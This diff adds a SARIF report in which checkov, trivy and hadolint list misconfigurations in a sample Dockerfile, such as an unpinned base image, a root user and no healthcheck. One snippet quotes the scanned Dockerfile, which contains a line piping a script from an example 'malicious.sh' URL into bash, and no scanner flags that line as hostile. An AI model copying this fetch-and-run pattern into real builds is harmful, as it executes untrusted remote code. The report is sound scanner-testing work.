@@ -1,0 +1,356 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "sentinel-iac",
+          "version": "0.1.0"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CKV_DOCKER_7",
+          "ruleIndex": 0,
+          "level": "error",
+          "attachments": [],
+          "message": {
+            "text": "Ensure the base image uses a non latest version tag"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scan/Dockerfile"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 1,
+                  "snippet": {
+                    "text": "FROM ubuntu:latest\n"
+                  }
+                }
+              }
+            }
+          ],
+          "sentinel_id": "76351a4c6b668644",
+          "source_engine": "checkov"
+        },
+        {
+          "ruleId": "CKV_DOCKER_8",
+          "ruleIndex": 1,
+          "level": "error",
+          "attachments": [],
+          "message": {
+            "text": "Ensure the last USER is not root"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scan/Dockerfile"
+                },
+                "region": {
+                  "startLine": 6,
+                  "endLine": 6,
+                  "snippet": {
+                    "text": "USER root\n"
+                  }
+                }
+              }
+            }
+          ],
+          "sentinel_id": "96fc8c8203d668c3",
+          "source_engine": "checkov"
+        },
+        {
+          "ruleId": "CKV_DOCKER_2",
+          "ruleIndex": 2,
+          "level": "error",
+          "attachments": [],
+          "message": {
+            "text": "Ensure that HEALTHCHECK instructions have been added to container images"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "scan/Dockerfile"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 7,
+                  "snippet": {
+                    "text": "FROM ubuntu:latest\nRUN apt-get update && apt-get install -y curl wget\nCOPY . /app\nWORKDIR /app\nRUN curl -sSL https://example.com/malicious.sh | bash\nUSER root\nCMD [\"bash\"]"
+                  }
+                }
+              }
+            }
+          ],
+          "sentinel_id": "f04059aad3f8dda3",
+          "source_engine": "checkov"
+        },
+        {
+          "ruleId": "DS-0001",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Artifact: Dockerfile\nType: dockerfile\nVulnerability DS-0001\nSeverity: MEDIUM\nMessage: Specify a tag in the 'FROM' statement for image 'ubuntu'\nLink: [DS-0001](https://avd.aquasec.com/misconfig/ds-0001)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "Dockerfile",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 1,
+                  "startColumn": 1,
+                  "endLine": 1,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "Dockerfile"
+              }
+            }
+          ],
+          "sentinel_id": "8ec5c5b0a69dde8e",
+          "source_engine": "trivy"
+        },
+        {
+          "ruleId": "DS-0002",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "Artifact: Dockerfile\nType: dockerfile\nVulnerability DS-0002\nSeverity: HIGH\nMessage: Last USER command in Dockerfile should not be 'root'\nLink: [DS-0002](https://avd.aquasec.com/misconfig/ds-0002)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "Dockerfile",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 6,
+                  "startColumn": 1,
+                  "endLine": 6,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "Dockerfile"
+              }
+            }
+          ],
+          "sentinel_id": "14d4c56c0fa0c1ba",
+          "source_engine": "trivy"
+        },
+        {
+          "ruleId": "DS-0026",
+          "ruleIndex": 2,
+          "level": "note",
+          "message": {
+            "text": "Artifact: Dockerfile\nType: dockerfile\nVulnerability DS-0026\nSeverity: LOW\nMessage: Add HEALTHCHECK instruction in your Dockerfile\nLink: [DS-0026](https://avd.aquasec.com/misconfig/ds-0026)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "Dockerfile",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 1,
+                  "startColumn": 1,
+                  "endLine": 1,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "Dockerfile"
+              }
+            }
+          ],
+          "sentinel_id": "393425fbd0771448",
+          "source_engine": "trivy"
+        },
+        {
+          "ruleId": "DS-0029",
+          "ruleIndex": 3,
+          "level": "error",
+          "message": {
+            "text": "Artifact: Dockerfile\nType: dockerfile\nVulnerability DS-0029\nSeverity: HIGH\nMessage: '--no-install-recommends' flag is missed: 'apt-get update && apt-get install -y curl wget'\nLink: [DS-0029](https://avd.aquasec.com/misconfig/ds-0029)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "Dockerfile",
+                  "uriBaseId": "ROOTPATH"
+                },
+                "region": {
+                  "startLine": 2,
+                  "startColumn": 1,
+                  "endLine": 2,
+                  "endColumn": 1
+                }
+              },
+              "message": {
+                "text": "Dockerfile"
+              }
+            }
+          ],
+          "sentinel_id": "89c8390a2b92ad54",
+          "source_engine": "trivy"
+        },
+        {
+          "ruleId": "DL3007",
+          "level": "warning",
+          "message": {
+            "text": "Using latest is prone to errors if the image will ever update. Pin the version explicitly to a release tag"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/scan/Dockerfile"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "sentinel_id": "ba15588842db96d7",
+          "source_engine": "hadolint"
+        },
+        {
+          "ruleId": "DL3015",
+          "level": "warning",
+          "message": {
+            "text": "Avoid additional packages by specifying `--no-install-recommends`"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/scan/Dockerfile"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "sentinel_id": "3249ce3d010e1cbd",
+          "source_engine": "hadolint"
+        },
+        {
+          "ruleId": "DL3008",
+          "level": "warning",
+          "message": {
+            "text": "Pin versions in apt get install. Instead of `apt-get install <package>` use `apt-get install <package>=<version>`"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/scan/Dockerfile"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "sentinel_id": "51b9e3a1969020b8",
+          "source_engine": "hadolint"
+        },
+        {
+          "ruleId": "DL3009",
+          "level": "warning",
+          "message": {
+            "text": "Delete the apt lists (/var/lib/apt/lists) after installing something"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/scan/Dockerfile"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "sentinel_id": "f2fe8446cc7be658",
+          "source_engine": "hadolint"
+        },
+        {
+          "ruleId": "DL4006",
+          "level": "warning",
+          "message": {
+            "text": "Set the SHELL option -o pipefail before RUN with a pipe in it. If you are using /bin/sh in an alpine image or if your shell is symlinked to busybox then consider explicitly setting your SHELL to /bin/ash, or disable this check"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/scan/Dockerfile"
+                },
+                "region": {
+                  "startLine": 5
+                }
+              }
+            }
+          ],
+          "sentinel_id": "80b78ece82eb0099",
+          "source_engine": "hadolint"
+        },
+        {
+          "ruleId": "DL3002",
+          "level": "warning",
+          "message": {
+            "text": "Last USER should not be root"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/scan/Dockerfile"
+                },
+                "region": {
+                  "startLine": 6
+                }
+              }
+            }
+          ],
+          "sentinel_id": "e2a59fcb6dd9efec",
+          "source_engine": "hadolint"
+        }
+      ],
+      "artifacts": [
+        {
+          "location": {
+            "uri": "\\scan\\Dockerfile"
+          }
+        },
+        {
+          "location": {
+            "uri": "Dockerfile"
+          }
+        },
+        {
+          "location": {
+            "uri": "scan\\Dockerfile"
+          }
+        }
+      ]
+    }
+  ]
+}
